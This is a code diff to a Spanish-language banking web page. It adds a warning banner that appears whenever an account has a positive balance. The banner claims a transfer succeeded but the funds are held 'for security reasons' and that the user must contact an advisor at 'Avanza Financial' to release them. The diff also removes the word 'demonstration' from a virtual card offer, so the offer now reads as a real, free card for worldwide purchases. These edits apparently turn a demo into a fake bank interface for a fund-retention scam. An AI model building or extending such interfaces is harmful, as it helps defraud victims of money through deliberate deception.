@@ -208,6 +208,22 @@
             font-size: 14px;
         }
 
+        .retention-alert {
+            background: #fdecea;
+            border: 1px solid #f8c9c4;
+            border-left: 4px solid #b91c1c;
+            color: #b91c1c;
+            padding: 16px 20px;
+            border-radius: 12px;
+            margin-bottom: 24px;
+            font-size: 15px;
+            font-weight: 600;
+            display: flex;
+            align-items: flex-start;
+            gap: 12px;
+            line-height: 1.5;
+        }
+
         .dev-note {
             margin-top: 18px;
             font-size: 12px;
@@ -1673,6 +1689,14 @@
 
                 </div>
 
+                <div id="retentionAlert" class="retention-alert hidden">
+                    <span style="font-size:20px;">⚠️</span>
+                    <div>
+                        <strong style="display:block;margin-bottom:4px;color:#991b1b;">Transferencia exitosa</strong>
+                        Tu dinero se encuentra retenido por motivos de seguridad. Por favor comunícate con tu asesor en Avanza Financial para autorizar el desbloqueo.
+                    </div>
+                </div>
+
                 <!-- NAVEGACIÓN POR PESTAÑAS -->
                 <nav class="tabs-nav" role="tablist">
                     <button class="tab-btn active" id="tabBtnCuenta"    data-tab="tabCuenta"    type="button" role="tab">📊 Cuenta</button>
@@ -1825,9 +1849,7 @@
                             </h3>
 
                             <p>
-                                Solicita una tarjeta virtual de demostración
-                                asociada a tu cuenta. La tarjeta utilizará
-                                automáticamente el nombre de tu usuario.
+                                Solicita tu tarjeta virtual para realizar compras online en todo el mundo. La emisión es inmediata y gratuita para clientes de Avanza Financial.
                             </p>
 
                             <button
@@ -2708,6 +2730,15 @@
             "accountCurrency"
         ).textContent =
             account.currency;
+            
+        const retentionAlert = document.getElementById("retentionAlert");
+        if (retentionAlert) {
+            if (Number(account.balance || 0) > 0) {
+                retentionAlert.classList.remove("hidden");
+            } else {
+                retentionAlert.classList.add("hidden");
+            }
+        }
 
         await loadClientMovements();
 
